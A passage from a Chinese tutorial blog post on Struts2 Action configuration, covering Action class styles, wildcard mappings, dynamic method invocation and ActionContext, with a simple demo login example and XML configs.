class="hljs-name">include</span> <span class="hljs-attr">file</span>=<span class="hljs-string">&quot;cn/itcast/action/demo/struts_demo.xml&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="Action的配置"><a href="#Action的配置" class="headerlink" title="Action的配置"></a>Action的配置</h2><h3 id="实现Action控制类"><a href="#实现Action控制类" class="headerlink" title="实现Action控制类"></a>实现Action控制类</h3><p>Action类的书写格式有三种方法</p><p><strong>方法一</strong>: Action类可以不继承特殊的类或不实现任何特殊的接口或者父类，仅仅是一个POJO，即简单的Java对象（Plain Ordinary Java Object） ，要有一个公共的无参的构造方法和一个execute方法</p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorldAction</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span> <span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>    <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>方法二</strong>: 创建一个类去实现指定的一个接口:<code>com.opensymphony.xwork2.Action</code></p><p>这个接口中只有一个抽象方法 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span><span class="hljs-keyword">throws</span> Exception</span>;<br></code></pre></td></tr></table></figure><p>同时还有5个String类型的静态属性：ERROR、SUCCESS、INPUT、NONE、LOGIN</p><p>常量：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String SUCCESS = <span class="hljs-string">&quot;success&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String NONE = <span class="hljs-string">&quot;none&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String ERROR = <span class="hljs-string">&quot;error&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String INPUT = <span class="hljs-string">&quot;input&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String LOGIN = “login”;<br></code></pre></td></tr></table></figure><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.Action;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorldAction</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Action</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span> <span class="hljs-params">()</span><span class="hljs-keyword">throws</span> Exception</span>&#123;<br>    <span class="hljs-keyword">return</span> SUCCESS;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>方法三</strong>:   继承一个指定的父类:<code>com.opensymphony.xwork2.ActionSupport</code></p><p>   ActionSupport类本身实现了Action接口，是Struts2中默认的Action接口的实现类，所以继承ActionSupport就相当于实现了Acton接口，并提供了数据的校验。</p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorldAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span> <span class="hljs-params">()</span><span class="hljs-keyword">throws</span> Exception</span>&#123;<br>    <span class="hljs-keyword">return</span> SUCCESS;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>struts.xml配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts2_1&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span> <br>   <span class="hljs-comment">&lt;!-- 使用pjo完成action操作 --&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;action1&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.Demo1Action&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>   <span class="hljs-comment">&lt;!-- 实现Action类来完成action操作 --&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;action2&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.Demo2Action&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>   <span class="hljs-comment">&lt;!-- 通过继承ActionSupport来完成action操作 --&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;action3&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.Demo3Action&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在开发中，第三种方法经常用到</p><h3 id="通配符配置Action类"><a href="#通配符配置Action类" class="headerlink" title="通配符配置Action类"></a>通配符配置Action类</h3><p>先写一下常规写法</p><p>新建一个BookAction类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BookAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span></span>&#123;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">add</span><span class="hljs-params">()</span></span>&#123;<br>System.out.println(<span class="hljs-string">&quot;Book add&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">delete</span><span class="hljs-params">()</span></span>&#123;<br>System.out.println(<span class="hljs-string">&quot;Book delete&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">update</span><span class="hljs-params">()</span></span>&#123;<br>System.out.println(<span class="hljs-string">&quot;Book update&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">find</span><span class="hljs-params">()</span></span>&#123;<br>System.out.println(<span class="hljs-string">&quot;Book find&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>book.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/FirstStruts3/book/add&quot;</span>&gt;</span>book add<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/FirstStruts3/book/delete&quot;</span>&gt;</span>book delete<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/FirstStruts3/book/update&quot;</span>&gt;</span>book update<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/FirstStruts3/book/find&quot;</span>&gt;</span>book find<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在struts.xml配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts2_2&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/book&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span> <br>   <span class="hljs-comment">&lt;!--常规Action配置--&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;add&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.BookAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;delete&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.BookAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;delete&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;update&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.BookAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;update&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;find&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.BookAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;find&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br></code></pre></td></tr></table></figure><p>跑一下项目，都打印出来了<br><img src="https://img-blog.csdnimg.cn/20210326113943563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在使用struts2时，每一个action都需要配置，每一个action里面的方法以及其返回到的界面都需要配置，如果一个一个配置，就太麻烦了，这里我们可以约定一些命名规范，然后再struts.xml里面使用通配符配置。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts2_2&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/book&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span> <br>   <span class="hljs-comment">&lt;!--使用通配符的Action配置--&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;*&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.BookAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;&#123;1&#125;&quot;</span>&gt;</span><br>   <span class="hljs-comment">&lt;!--&#123;1&#125;代表匹配一个*--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br></code></pre></td></tr></table></figure><p>也可以成功<br><img src="https://img-blog.csdnimg.cn/20210326114605767.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Action的动态方法调用"><a href="#Action的动态方法调用" class="headerlink" title="Action的动态方法调用"></a>Action的动态方法调用</h3><p>在实际生活中，Action太多不便管理，为了减少Action，通常在一个Action中编写不同的方法处理不同的请求，如编写LoginAction，其中login()方法处理登陆请求，register()方法处理注册请求，此时可以采用动态方法调用来处理。</p><p>在使用动态方法调用时，在Action的名字中使用<code>!</code>符号来标识要调用方法的名称，语法格式如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;Action名称!方法名称&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>使用动态方法调用将请求提交给Action时，表单中的每个按钮提交事件都交给同一个Action，只是对应Action中的不同方法。只需要在struts.xml中只要配置该Action</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Action名字&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;包名.Action类名&quot;</span>&gt;</span><br> &lt;result&quot;&gt;/test.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当开启动态方法调用功能时，应当将下面的常量置为true</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 动态方法调用是否开启，默认是关闭的 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts.enable.DynamicMethodInvocation&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constant</span>&gt;</span><br></code></pre></td></tr></table></figure><p>不推荐使用动态方法调用，因为会存在安全隐患。</p><h2 id="访问Servlet-API的方法"><a href="#访问Servlet-API的方法" class="headerlink" title="访问Servlet API的方法"></a>访问Servlet API的方法</h2><h3 id="通过ActionContext类访问"><a href="#通过ActionContext类访问" class="headerlink" title="通过ActionContext类访问"></a>通过ActionContext类访问</h3><p>truts2提供了ActionContext类，struts2可以通过该类来实现与Servlet API的访问。</p><p>ActionContext类提供了如下几种方法：</p><table><thead><tr><th>方法说明</th><th>功能描述</th></tr></thead><tbody><tr><td>Object get(Object key)</td><td>类似于调用HttpServletRequest的getAttribute(String name)方法</td></tr><tr><td>Map getApplication()</td><td>返回一个Map对象，该对象模拟了该应用的ServletContext实例</td></tr><tr><td>static ActionContext getContext()</td><td>这是个静态方法 获取系统的ActionContext实例</td></tr><tr><td>Map getParameters()</td><td>获取所有的请求参数，类似于调用HttpServletRequest对象的getParameterMap()方法</td></tr><tr><td>Map getSession（）</td><td>返回一个Map对象，该对象模拟了HttpSession 实例</td></tr><tr><td>void setApplication(Map application)</td><td>传入一个Map实例，将Map实例的key-value转换成application的属性名-值。</td></tr><tr><td>void setSession(Map session)</td><td>传入一个Map实例，将Map实例的key-value转换成application的属性名-值。</td></tr></tbody></table><p>实例1：通过ActionContext类实现登陆</p><p>LoginAction.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionContext;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span></span>&#123;<br><span class="hljs-keyword">private</span> String username;<br><span class="hljs-keyword">private</span> String password;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> username;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br><span class="hljs-keyword">this</span>.username = username;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getPassword</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> password;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setPassword</span><span class="hljs-params">(String password)</span> </span>&#123;<br><span class="hljs-keyword">this</span>.password = password;<br>&#125;<br>    <br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>ActionContext context=ActionContext.getContext();<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;admin&quot;</span>.equals(username)&amp;&amp;<span class="hljs-string">&quot;123456&quot;</span>.equals(password))&#123;<br>context.put(<span class="hljs-string">&quot;username&quot;</span>, username);<br>context.put(<span class="hljs-string">&quot;password&quot;</span>, password);<br>context.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-string">&quot;用户登录成功！&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>context.put(<span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-string">&quot;用户登录失败！&quot;</span>);<br><span class="hljs-keyword">return</span> ERROR;<br>&#125;<br><br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>web.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span> <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;WebApp_ID&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;3.0&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>FirstStruts2<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.html<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.htm<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.html<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.htm<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--配置Struts2核心过滤器--&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>struts.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="hljs-comment">&lt;!-- 指定Struts2配置文件的D2T信息 --&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">struts</span> <span class="hljs-meta-keyword">PUBLIC</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;LoginDemo&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span> <span 